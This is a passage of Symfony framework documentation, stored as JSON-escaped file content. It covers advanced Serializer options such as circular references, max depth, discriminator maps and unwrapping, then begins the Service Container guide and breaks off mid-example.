``firstName``).\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\PropertyNormalizer`\n    This is yet another alternative to the ``ObjectNormalizer``. This\n    normalizer directly reads and writes public properties as well as\n    **private and protected** properties (from both the class and all of\n    its parent classes) by using `PHP reflection`_. It supports calling the\n    constructor during the denormalization process.\n\n    Objects are normalized to a map of property names to property values.\n\n    You can also limit the normalizer to only use properties with a specific\n    visibility (e.g. only public properties) using the\n    ``PropertyNormalizer::NORMALIZE_VISIBILITY`` context option. You can set it\n    to any combination of the ``PropertyNormalizer::NORMALIZE_PUBLIC``,\n    ``PropertyNormalizer::NORMALIZE_PROTECTED`` and\n    ``PropertyNormalizer::NORMALIZE_PRIVATE`` constants::\n\n        use Symfony\\Component\\Serializer\\Normalizer\\PropertyNormalizer;\n        // ...\n\n        $json = $serializer->serialize($person, 'json', [\n            // only serialize public properties\n            PropertyNormalizer::NORMALIZE_VISIBILITY => PropertyNormalizer::NORMALIZE_PUBLIC,\n\n            // serialize public and protected properties\n            PropertyNormalizer::NORMALIZE_VISIBILITY => PropertyNormalizer::NORMALIZE_PUBLIC | PropertyNormalizer::NORMALIZE_PROTECTED,\n        ]);\n\nDebugging the Serializer\n------------------------\n\nUse the ``debug:serializer`` command to dump the serializer metadata of a\ngiven class:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:serializer 'App\\Entity\\Book'\n\n        App\\Entity\\Book\n        ---------------\n\n        +----------+------------------------------------------------------------+\n        | Property | Options                                                    |\n        +----------+------------------------------------------------------------+\n        | name     | [                                                          |\n        |          |   \"groups\" => [                                            |\n        |          |       \"book:read\",                                         |\n        |          |       \"book:write\",                                        |\n        |          |   ],                                                       |\n        |          |   \"maxDepth\" => 1,                                         |\n        |          |   \"serializedName\" => \"book_name\",                         |\n        |          |   \"serializedPath\" => null,                                |\n        |          |   \"ignore\" => false,                                       |\n        |          |   \"normalizationContexts\" => [],                           |\n        |          |   \"denormalizationContexts\" => []                          |\n        |          | ]                                                          |\n        | isbn     | [                                                          |\n        |          |   \"groups\" => [                                            |\n        |          |       \"book:read\",                                         |\n        |          |   ],                                                       |\n        |          |   \"maxDepth\" => null,                                      |\n        |          |   \"serializedName\" => null,                                |\n        |          |   \"serializedPath\" => \"[data][isbn]\",                      |\n        |          |   \"ignore\" => false,                                       |\n        |          |   \"normalizationContexts\" => [],                           |\n        |          |   \"denormalizationContexts\" => []                          |\n        |          | ]                                                          |\n        +----------+------------------------------------------------------------+\n\nAdvanced Serialization\n----------------------\n\nSkipping ``null`` Values\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nBy default, the Serializer will preserve properties containing a ``null`` value.\nYou can change this behavior by setting the ``AbstractObjectNormalizer::SKIP_NULL_VALUES`` context option\nto ``true``::\n\n    class Person\n    {\n        public string $name = 'Jane Doe';\n        public ?string $gender = null;\n    }\n\n    $jsonContent = $serializer->serialize(new Person(), 'json', [\n        AbstractObjectNormalizer::SKIP_NULL_VALUES => true,\n    ]);\n    // $jsonContent contains {\"name\":\"Jane Doe\"}\n\nHandling Uninitialized Properties\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn PHP, typed properties have an ``uninitialized`` state which is different\nfrom the default ``null`` of untyped properties. When you try to access a typed\nproperty before giving it an explicit value, you get an error.\n\nTo avoid the serializer throwing an error when serializing or normalizing\nan object with uninitialized properties, by default the ``ObjectNormalizer``\ncatches these errors and ignores such properties.\n\nYou can disable this behavior by setting the\n``AbstractObjectNormalizer::SKIP_UNINITIALIZED_VALUES`` context option to\n``false``::\n\n    class Person {\n        public string $name = 'Jane Doe';\n        public string $phoneNumber; // uninitialized\n    }\n\n    $jsonContent = $normalizer->serialize(new Dummy(), 'json', [\n        AbstractObjectNormalizer::SKIP_UNINITIALIZED_VALUES => false,\n    ]);\n    // throws Symfony\\Component\\PropertyAccess\\Exception\\UninitializedPropertyException\n    // as the ObjectNormalizer cannot read uninitialized properties\n\n.. note::\n\n    Using :class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\PropertyNormalizer`\n    or :class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\GetSetMethodNormalizer`\n    with ``AbstractObjectNormalizer::SKIP_UNINITIALIZED_VALUES`` context\n    option set to ``false`` will throw an ``\\Error`` instance if the given\n    object has uninitialized properties as the normalizers cannot read them\n    (directly or via getter/isser methods).\n\n.. _component-serializer-handling-circular-references:\n\nHandling Circular References\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nCircular references are common when dealing with associated objects::\n\n    class Organization\n    {\n        public function __construct(\n            private string $name,\n            private array $members = []\n        ) {\n        }\n\n        public function getName(): string\n        {\n            return $this->name;\n        }\n\n        public function addMember(Member $member): void\n        {\n            $this->members[] = $member;\n        }\n\n        public function getMembers(): array\n        {\n            return $this->members;\n        }\n    }\n\n    class Member\n    {\n        private Organization $organization;\n\n        public function __construct(\n            private string $name\n        ) {\n        }\n\n        public function getName(): string\n        {\n            return $this->name;\n        }\n\n        public function setOrganization(Organization $organization): void\n        {\n            $this->organization = $organization;\n        }\n\n        public function getOrganization(): Organization\n        {\n            return $this->organization;\n        }\n    }\n\nTo avoid infinite loops, the normalizers throw a\n:class:`Symfony\\\\Component\\\\Serializer\\\\Exception\\\\CircularReferenceException`\nwhen such a case is encountered::\n\n    $organization = new Organization('Les-Tilleuls.coop');\n    $member = new Member('Kévin');\n\n    $organization->addMember($member);\n    $member->setOrganization($organization);\n\n    $jsonContent = $serializer->serialize($organization, 'json');\n    // throws a CircularReferenceException\n\nThe key ``circular_reference_limit`` in the context sets the number of\ntimes it will serialize the same object before considering it a circular\nreference. The default value is ``1``.\n\nInstead of throwing an exception, circular references can also be handled\nby custom callables. This is especially useful when serializing entities\nhaving unique identifiers::\n\n    use Symfony\\Component\\Serializer\\Exception\\CircularReferenceException;\n\n    $context = [\n        AbstractNormalizer::CIRCULAR_REFERENCE_HANDLER => function (object $object, ?string $format, array $context): string {\n            if (!$object instanceof Organization) {\n                throw new CircularReferenceException('A circular reference has been detected when serializing the object of class \"'.get_debug_type($object).'\".');\n            }\n\n            // serialize the nested Organization with only the name (and not the members)\n            return $object->getName();\n        },\n    ];\n\n    $jsonContent = $serializer->serialize($organization, 'json', $context);\n    // $jsonContent contains {\"name\":\"Les-Tilleuls.coop\",\"members\":[{\"name\":\"K\\u00e9vin\", organization: \"Les-Tilleuls.coop\"}]}\n\n.. _serializer_handling-serialization-depth:\n\nHandling Serialization Depth\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe serializer can also detect nested objects of the same class and limit\nthe serialization depth. This is useful for tree structures, where the same\nobject is nested multiple times.\n\nFor instance, assume a data structure of a family tree::\n\n    // ...\n    class Person\n    {\n        // ...\n\n        public function __construct(\n            private string $name,\n            private ?self $mother\n        ) {\n        }\n\n        public function getName(): string\n        {\n            return $this->name;\n        }\n\n        public function getMother(): ?self\n        {\n            return $this->mother;\n        }\n\n        // ...\n    }\n\n    // ...\n    $greatGrandmother = new Person('Elizabeth', null);\n    $grandmother = new Person('Jane', $greatGrandmother);\n    $mother = new Person('Sophie', $grandmother);\n    $child = new Person('Joe', $mother);\n\nYou can specify the maximum depth for a given property. For instance, you\ncan set the max depth to ``1`` to always only serialize someone's mother\n(and not their grandmother, etc.):\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Model/Person.php\n        namespace App\\Model;\n\n        use Symfony\\Component\\Serializer\\Attribute\\MaxDepth;\n\n        class Person\n        {\n            #[MaxDepth(1)]\n            private ?self $mother;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/serializer/person.yaml\n        App\\Model\\Person:\n            attributes:\n                mother:\n                    max_depth: 1\n\n    .. code-block:: xml\n\n        <!-- config/serializer/person.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"mother\" max-depth=\"1\"/>\n            </class>\n        </serializer>\n\nTo limit the serialization depth, you must set the\n``AbstractObjectNormalizer::ENABLE_MAX_DEPTH`` key to ``true`` in the\ncontext (or the default context specified in ``framework.yaml``)::\n\n    // ...\n    $greatGrandmother = new Person('Elizabeth', null);\n    $grandmother = new Person('Jane', $greatGrandmother);\n    $mother = new Person('Sophie', $grandmother);\n    $child = new Person('Joe', $mother);\n\n    $jsonContent = $serializer->serialize($child, null, [\n        AbstractObjectNormalizer::ENABLE_MAX_DEPTH => true\n    ]);\n    // $jsonContent contains {\"name\":\"Joe\",\"mother\":{\"name\":\"Sophie\"}}\n\nYou can also configure a custom callable that is used when the maximum\ndepth is reached. This can be used to for instance return the unique\nidentifier of the next nested object, instead of omitting the property::\n\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractObjectNormalizer;\n    // ...\n\n    $greatGrandmother = new Person('Elizabeth', null);\n    $grandmother = new Person('Jane', $greatGrandmother);\n    $mother = new Person('Sophie', $grandmother);\n    $child = new Person('Joe', $mother);\n\n    // all callback parameters are optional (you can omit the ones you don't use)\n    $maxDepthHandler = function (object $innerObject, object $outerObject, string $attributeName, ?string $format = null, array $context = []): ?string {\n        // return only the name of the next person in the tree\n        return $innerObject instanceof Person ? $innerObject->getName() : null;\n    };\n\n    $jsonContent = $serializer->serialize($child, null, [\n        AbstractObjectNormalizer::ENABLE_MAX_DEPTH => true,\n        AbstractObjectNormalizer::MAX_DEPTH_HANDLER => $maxDepthHandler,\n    ]);\n    // $jsonContent contains {\"name\":\"Joe\",\"mother\":{\"name\":\"Sophie\",\"mother\":\"Jane\"}}\n\nUsing Callbacks to Serialize Properties with Object Instances\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen serializing, you can set a callback to format a specific object\nproperty. This can be used instead of\n:ref:`defining the context for a group <serializer-context-group>`::\n\n    $person = new Person('cordoval', 34);\n    $person->setCreatedAt(new \\DateTime('now'));\n\n    $context = [\n        AbstractNormalizer::CALLBACKS => [\n            // all callback parameters are optional (you can omit the ones you don't use)\n            'createdAt' => function (object $attributeValue, object $object, string $attributeName, ?string $format = null, array $context = []) {\n                return $attributeValue instanceof \\DateTime ? $attributeValue->format(\\DateTime::ATOM) : '';\n            },\n        ],\n    ];\n    $jsonContent = $serializer->serialize($person, 'json', $context);\n    // $jsonContent contains {\"name\":\"cordoval\",\"age\":34,\"createdAt\":\"2014-03-22T09:43:12-0500\"}\n\nAdvanced Deserialization\n------------------------\n\nRequire all Properties\n~~~~~~~~~~~~~~~~~~~~~~\n\nBy default, the Serializer will add ``null`` to nullable properties when\nthe parameters for those are not provided. You can change this behavior by\nsetting the ``AbstractNormalizer::REQUIRE_ALL_PROPERTIES`` context option\nto ``true``::\n\n    class Person\n    {\n        public function __construct(\n            public string $firstName,\n            public ?string $lastName,\n        ) {\n        }\n    }\n\n    // ...\n    $data = ['firstName' => 'John'];\n    $person = $serializer->deserialize($data, Person::class, 'json', [\n        AbstractNormalizer::REQUIRE_ALL_PROPERTIES => true,\n    ]);\n    // throws Symfony\\Component\\Serializer\\Exception\\MissingConstructorArgumentException\n\nCollecting Type Errors While Denormalizing\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen denormalizing a payload to an object with typed properties, you'll get an\nexception if the payload contains properties that don't have the same type as\nthe object.\n\nUse the ``COLLECT_DENORMALIZATION_ERRORS`` option to collect all exceptions\nat once, and to get the object partially denormalized::\n\n    try {\n        $person = $serializer->deserialize($jsonString, Person::class, 'json', [\n            DenormalizerInterface::COLLECT_DENORMALIZATION_ERRORS => true,\n        ]);\n    } catch (PartialDenormalizationException $e) {\n        $violations = new ConstraintViolationList();\n\n        /** @var NotNormalizableValueException $exception */\n        foreach ($e->getErrors() as $exception) {\n            $message = sprintf('The type must be one of \"%s\" (\"%s\" given).', implode(', ', $exception->getExpectedTypes()), $exception->getCurrentType());\n            $parameters = [];\n            if ($exception->canUseMessageForUser()) {\n                $parameters['hint'] = $exception->getMessage();\n            }\n            $violations->add(new ConstraintViolation($message, '', $parameters, null, $exception->getPath(), null));\n        }\n\n        // ... return violation list to the user\n    }\n\n.. _serializer-populate-existing-object:\n\nDeserializing in an Existing Object\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe serializer can also be used to update an existing object. You can do\nthis by configuring the ``object_to_populate`` serializer context option::\n\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractNormalizer;\n\n    // ...\n    $person = new Person('Jane Doe', 59);\n\n    $serializer->deserialize($jsonData, Person::class, 'json', [\n        AbstractNormalizer::OBJECT_TO_POPULATE => $person,\n    ]);\n    // instead of returning a new object, $person is updated instead\n\n.. note::\n\n    The ``AbstractNormalizer::OBJECT_TO_POPULATE`` option is only used for\n    the top level object. If that object is the root of a tree structure,\n    all child elements that exist in the normalized data will be re-created\n    with new instances.\n\n    When the ``AbstractObjectNormalizer::DEEP_OBJECT_TO_POPULATE`` context\n    option is set to ``true``, existing children of the root ``OBJECT_TO_POPULATE``\n    are updated from the normalized data, instead of the denormalizer\n    re-creating them. This only works for single child objects, not for\n    arrays of objects. Those will still be replaced when present in the\n    normalized data.\n\n.. _serializer_interfaces-and-abstract-classes:\n\nDeserializing Interfaces and Abstract Classes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen working with associated objects, a property sometimes reference an\ninterface or abstract class. When deserializing these properties, the\nSerializer has to know which concrete class to initialize. This is done\nusing a *discriminator class mapping*.\n\nImagine there is an ``InvoiceItemInterface`` that is implemented by the\n``Product`` and ``Shipping`` objects. When serializing an object, the\nserializer will add an extra \"discriminator attribute\". This contains\neither ``product`` or ``shipping``. The discriminator class map maps\nthese type names to the real PHP class name when deserializing:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        namespace App\\Model;\n\n        use Symfony\\Component\\Serializer\\Attribute\\DiscriminatorMap;\n\n        #[DiscriminatorMap(\n            typeProperty: 'type',\n            mapping: [\n                'product' => Product::class,\n                'shipping' => Shipping::class,\n            ]\n        )]\n        interface InvoiceItemInterface\n        {\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        App\\Model\\InvoiceItemInterface:\n            discriminator_map:\n                type_property: type\n                mapping:\n                    product: 'App\\Model\\Product'\n                    shipping: 'App\\Model\\Shipping'\n\n    .. code-block:: xml\n\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\InvoiceItemInterface\">\n                <discriminator-map type-property=\"type\">\n                    <mapping type=\"product\" class=\"App\\Model\\Product\"/>\n                    <mapping type=\"shipping\" class=\"App\\Model\\Shipping\"/>\n                </discriminator-map>\n            </class>\n        </serializer>\n\nWith the discriminator map configured, the serializer can now pick the\ncorrect class for properties typed as ``InvoiceItemInterface``::\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        class InvoiceLine\n        {\n            public function __construct(\n                private InvoiceItemInterface $invoiceItem\n            ) {\n                $this->invoiceItem = $invoiceItem;\n            }\n\n            public function getInvoiceItem(): InvoiceItemInterface\n            {\n                return $this->invoiceItem;\n            }\n\n            // ...\n        }\n\n        // ...\n        $invoiceLine = new InvoiceLine(new Product());\n\n        $jsonString = $serializer->serialize($invoiceLine, 'json');\n        // $jsonString contains {\"type\":\"product\",...}\n\n        $invoiceLine = $serializer->deserialize($jsonString, InvoiceLine::class, 'json');\n        // $invoiceLine contains new InvoiceLine(new Product(...))\n\n    .. code-block:: php-standalone\n\n        // ...\n        use Symfony\\Component\\Serializer\\Mapping\\ClassDiscriminatorFromClassMetadata;\n        use Symfony\\Component\\Serializer\\Mapping\\Factory\\ClassMetadataFactory;\n        use Symfony\\Component\\Serializer\\Mapping\\Loader\\AttributeLoader;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n        use Symfony\\Component\\Serializer\\Serializer;\n\n        class InvoiceLine\n        {\n            public function __construct(\n                private InvoiceItemInterface $invoiceItem\n            ) {\n                $this->invoiceItem = $invoiceItem;\n            }\n\n            public function getInvoiceItem(): InvoiceItemInterface\n            {\n                return $this->invoiceItem;\n            }\n\n            // ...\n        }\n\n        // ...\n\n        // Configure a loader to retrieve mapping information like DiscriminatorMap.\n        // E.g. when using PHP attributes:\n        $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());\n        $discriminator = new ClassDiscriminatorFromClassMetadata($classMetadataFactory);\n        $normalizers = [\n            new ObjectNormalizer($classMetadataFactory, null, null, null, $discriminator),\n        ];\n\n        $serializer = new Serializer($normalizers, $encoders);\n\n        $invoiceLine = new InvoiceLine(new Product());\n\n        $jsonString = $serializer->serialize($invoiceLine, 'json');\n        // $jsonString contains {\"type\":\"product\",...}\n\n        $invoiceLine = $serializer->deserialize($jsonString, InvoiceLine::class, 'json');\n        // $invoiceLine contains new InvoiceLine(new Product(...))\n\n.. _serializer-unwrapping-denormalizer:\n\nDeserializing Input Partially (Unwrapping)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe serializer will always deserialize the complete input string into PHP\nvalues. When connecting with third party APIs, you often only need a\nspecific part of the returned response.\n\nTo avoid deserializing the whole response, you can use the\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\UnwrappingDenormalizer`\nand \"unwrap\" the input data::\n\n    $jsonData = '{\"result\":\"success\",\"data\":{\"person\":{\"name\": \"Jane Doe\",\"age\":57}}}';\n    $data = $serialiser->deserialize($jsonData, Object::class, [\n        UnwrappingDenormalizer::UNWRAP_PATH => '[data][person]',\n    ]);\n    // $data is Person(name: 'Jane Doe', age: 57)\n\nThe ``unwrap_path`` is a :ref:`property path <property-access-reading-arrays>`\nof the PropertyAccess component, applied on the denormalized array.\n\nHandling Constructor Arguments\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf the class constructor defines arguments, as usually happens with\n`Value Objects`_, the serializer will match the parameter names with the\ndeserialized attributes. If some parameters are missing, a\n:class:`Symfony\\\\Component\\\\Serializer\\\\Exception\\\\MissingConstructorArgumentsException`\nis thrown.\n\nIn these cases, use the ``default_constructor_arguments`` context option to\ndefine default values for the missing parameters::\n\n    use App\\Model\\Person;\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractNormalizer;\n    // ...\n\n    $jsonData = '{\"age\":39,\"name\":\"Jane Doe\"}';\n    $person = $serializer->deserialize($jsonData, Person::class, 'json', [\n        AbstractNormalizer::DEFAULT_CONSTRUCTOR_ARGUMENTS => [\n            Person::class => ['sportsperson' => true],\n        ],\n    ]);\n    // $person is Person(name: 'Jane Doe', age: 39, sportsperson: true);\n\nRecursive Denormalization and Type Safety\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen a ``PropertyTypeExtractor`` is available, the normalizer will also\ncheck that the data to denormalize matches the type of the property (even\nfor primitive types). For instance, if a ``string`` is provided, but the\ntype of the property is ``int``, an\n:class:`Symfony\\\\Component\\\\Serializer\\\\Exception\\\\UnexpectedValueException`\nwill be thrown. The type enforcement of the properties can be disabled by\nsetting the serializer context option\n``ObjectNormalizer::DISABLE_TYPE_ENFORCEMENT`` to ``true``.\n\nHandling Boolean Values\n~~~~~~~~~~~~~~~~~~~~~~~\n\n.. versionadded:: 7.1\n\n    The ``AbstractNormalizer::FILTER_BOOL`` context option was introduced in Symfony 7.1.\n\nPHP considers many different values as true or false. For example, the\nstrings ``true``, ``1``, and ``yes`` are considered true, while\n``false``, ``0``, and ``no`` are considered false.\n\nWhen deserializing, the Serializer component can take care of this\nautomatically. This can be done by using the ``AbstractNormalizer::FILTER_BOOL``\ncontext option::\n\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractNormalizer;\n    // ...\n\n    $person = $serializer->denormalize(['sportsperson' => 'yes'], Person::class, context: [\n        AbstractNormalizer::FILTER_BOOL => true\n    ]);\n    // $person contains a Person instance with sportsperson set to true\n\nThis context makes the deserialization process behave like the\n:phpfunction:`filter_var` function with the ``FILTER_VALIDATE_BOOL`` flag.\n\n.. _serializer-enabling-metadata-cache:\n\nConfiguring the Metadata Cache\n------------------------------\n\nThe metadata for the serializer is automatically cached to enhance application\nperformance. By default, the serializer uses the ``cache.system`` cache pool\nwhich is configured using the :ref:`cache.system <reference-cache-system>`\noption.\n\nGoing Further with the Serializer\n---------------------------------\n\n.. toctree::\n    :glob:\n    :maxdepth: 1\n\n    serializer/*\n\n.. _`JMS serializer`: https://github.com/schmittjoh/serializer\n.. _`API Platform`: https://api-platform.com\n.. _`JSON-LD`: https://json-ld.org\n.. _`Hydra Core Vocabulary`: https://www.hydra-cg.com/\n.. _`OpenAPI`: https://www.openapis.org\n.. _`GraphQL`: https://graphql.org\n.. _`JSON:API`: https://jsonapi.org\n.. _`HAL`: https://stateless.group/hal_specification.html\n.. _`RFC 7807`: https://tools.ietf.org/html/rfc7807\n.. _`RFC 4122`: https://tools.ietf.org/html/rfc4122\n.. _`RFC 3339`: https://tools.ietf.org/html/rfc3339#section-5.8\n.. _`list of PHP timezones`: https://www.php.net/manual/en/timezones.php\n.. _`data URI`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs\n.. _`PHP reflection`: https://php.net/manual/en/book.reflection.php\n.. _`Value Objects`: https://en.wikipedia.org/wiki/Value_object\n"
        },
        {
          "name": "serializer",
          "type": "tree",
          "content": null
        },
        {
          "name": "service_container.rst",
          "type": "blob",
          "size": 53.8115234375,
          "content": "Service Container\n=================\n\n.. admonition:: Screencast\n    :class: screencast\n\n    Do you prefer video tutorials? Check out the `Symfony Fundamentals screencast series`_.\n\nYour application is *full* of useful objects: a \"Mailer\" object might help you\nsend emails while another object might help you save things to the database.\nAlmost *everything* that your app \"does\" is actually done by one of these objects.\nAnd each time you install a new bundle, you get access to even more!\n\nIn Symfony, these useful objects are called **services** and each service lives\ninside a very special object called the **service container**. The container\nallows you to centralize the way objects are constructed. It makes your life\neasier, promotes a strong architecture and is super fast!\n\nFetching and using Services\n---------------------------\n\nThe moment you start a Symfony app, your container *already* contains many services.\nThese are like *tools*: waiting for you to take advantage of them. In your controller,\nyou can \"ask\" for a service from the container by type-hinting an argument with the\nservice's class or interface name. Want to :doc:`log </logging>` something? No problem::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use Psr\\Log\\LoggerInterface;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/products')]\n        public function list(LoggerInterface $logger): Response\n        {\n            $logger->info('Look, I just used a service!');\n\n            // ...\n        }\n    }\n\nWhat other services are available? Find out by running:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:autowiring\n\n      # this is just a *small* sample of the output...\n\n      Autowirable Types\n      =================\n\n       The following classes & interfaces can be used as type-hints when autowiring:\n\n       Describes a logger instance.\n       Psr\\Log\\LoggerInterface - alias:logger\n\n       Request stack that controls the lifecycle of requests.\n       Symfony\\Component\\HttpFoundation\\RequestStack - alias:request_stack\n\n       RouterInterface is the interface that all Router classes must implement.\n       Symfony\\Component\\Routing\\RouterInterface - alias:router.default\n\n       [...]\n\nWhen you use these type-hints in your controller methods or inside your\n:ref:`own services <service-container-creating-service>`, Symfony will automatically\npass you the service object matching that type.\n\nThroughout the docs, you'll see how to use the many different services that live\nin the container.\n\n.. tip::\n\n    There are actually *many* more services in the container, and each service has\n    a unique id in the container, like ``request_stack`` or ``router.default``. For a full\n    list, you can run ``php bin/console debug:container``. But most of the time,\n    you won't need to worry about this. See :ref:`how to choose a specific service\n    <services-wire-specific-service>`. See :doc:`/service_container/debug`.\n\n.. _service-container-creating-service:\n\nCreating/Configuring Services in the Container\n----------------------------------------------\n\nYou can also organize your *own* code into services. For example, suppose you need\nto show your users a random, happy message. If you put this code in your controller,\nit can't be re-used. Instead, you decide to create a new class::\n\n    // src/Service/MessageGenerator.php\n    namespace App\\Service;\n\n    class MessageGenerator\n    {\n        public function getHappyMessage(): string\n        {\n            $messages = [\n                'You did it! You updated the system! Amazing!',\n                'That was one of the coolest updates I\\'ve seen all day!',\n                'Great work! Keep going!',\n            ];\n\n            $index = array_rand($messages);\n\n            return $messages[$index];\n        }\n    }\n\nCongratulations! You've created your first service class! You can use it immediately\ninside your controller::\n\n    // src/Controller/ProductController.php\n    use App\\Service\\MessageGenerator;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/products/new')]\n        public function new(MessageGenerator $messageGenerator): Response\n        {\n            // thanks to the type-hint, the container will instantiate a\n            // new MessageGenerator and pass it to you!\n            // ...\n\n            $message = $messageGenerator->getHappyMessage();\n            $this->addFlash('success', $message);\n            // ...\n        }\n    }\n\nWhen you ask for the ``MessageGenerator`` service, the container constructs a new\n``MessageGenerator`` object and returns it (see sidebar below). But if you never ask\nfor the service, it's *never* constructed: saving memory and speed. As a bonus, the\n``MessageGenerator`` service is only created *once*: the same instance is returned\neach time you ask for it.\n\n.. _service-container-services-load-example:\n\n.. sidebar:: Automatic Service Loading in services.yaml\n\n    The documentation assumes you're using the following service configuration,\n    which is the default config for a new project:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/services.yaml\n            services:\n                # default configuration for services in *this* file\n                _defaults:\n                    autowire: true      # Automatically injects dependencies in your services.\n                    autoconfigure: true # Automatically registers your services as commands, event subscribers, etc.\n\n                # makes classes in src/ available to be used as services\n                # this creates a service per class whose id is the fully-qualified class name\n                App\\:\n                    resource: '../src/'\n                    exclude:\n                        - '../src/DependencyInjection/'\n                        - '../src/Entity/'\n                        - '../src/Kernel.php'\n\n                # order is important in this file because service definitions\n                # always *replace* previous ones; add your own service configuration below\n\n                # ...\n\n        .. code-block:: xml\n\n            <!-- config/services.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <container xmlns=\"http://symfony.com/schema/dic/services\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                    https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n                <services>\n                    <!-- Default configuration for services in *this* file -->\n                    <defaults autowire=\"true\" autoconfigure=\"true\"/>\n\n                    <!-- makes classes in src/ available to be used as services -->\n                    <!-- this creates a service per class whose id is the fully-qualified class name -->\n                    <prototype namespace=\"App\\\" resource=\"../src/\" exclude=\"../src/{DependencyInjection,Entity,Kernel.php}\"/>\n\n                    <!-- order is important in this file because service definitions\n                         always *replace* previous ones; add your own service configuration below -->\n\n                    <!-- ... -->\n\n                </services>\n            </container>\n\n        .. code-block:: php\n\n            // config/services.php\n            namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n            return function(ContainerConfigurator $container): void {\n                // default configuration for services in *this* file\n                $services = $container->services()\n                    ->defaults()\n                        ->autowire()      // Automatically injects dependencies in your services.\n                        ->autoconfigure() // Automatically registers your services as commands, event subscribers, etc.\n                ;\n\n                // makes classes in src/ available to be used as services\n                // this creates a service per class whose id is the fully-qualified class name\n                $services->load('App\\\\', '../src/')\n                    ->exclude('../src/{DependencyInjection,Entity,Kernel.php}');\n\n                // order is important in this file because service definitions\n                // always *replace* previous ones; add your own service configuration below\n            };\n\n    .. tip::\n\n        The value of the ``resource`` and ``exclude`` options can be any valid\n        `glob pattern`_. The value of the ``exclude`` option can also be an\n        array of glob patterns.\n\n    Thanks to this configuration, you can automatically use any classes from the\n    ``src/`` directory as a service, without needing to manually configure\n    it. Later, you'll learn how to :ref:`import many services at once\n    <service-psr4-loader>` with resource.\n\n    If you'd prefer to manually wire your service, you can\n    :ref:`use explicit configuration <services-explicitly-configure-wire-services>`.\n\n.. _service-container_limiting-to-env:\n\nLimiting Services to a specific Symfony Environment\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can use the ``#[When]`` attribute to only register the class\nas a service in some environments::\n\n    use Symfony\\Component\\DependencyInjection\\Attribute\\When;\n\n    // SomeClass is only registered in the \"dev\" environment\n\n    #[When(env: 'dev')]\n    class SomeClass\n    {\n        // ...\n    }\n\n    // you can also apply more than one When attribute to the same class\n\n    #[When(env: 'dev')]\n    #[When(env: 'test')]\n    class AnotherClass\n    {\n        // ...\n    }\n\n.. _services-constructor-injection:\n\nInjecting Services/Config into a Service\n----------------------------------------\n\nWhat if you need to access the ``logger`` service from within ``MessageGenerator``?\nNo problem! Create a ``__construct()`` method with a ``$logger`` argument that has\nthe ``LoggerInterface`` type-hint. Set this on a new ``$logger`` property\nand use it later::\n\n    // src/Service/MessageGenerator.php\n    namespace App\\Service;\n\n    use Psr\\Log\\LoggerInterface;\n\n    class MessageGenerator\n    {\n        public function __construct(\n            private LoggerInterface $logger,\n        ) {\n        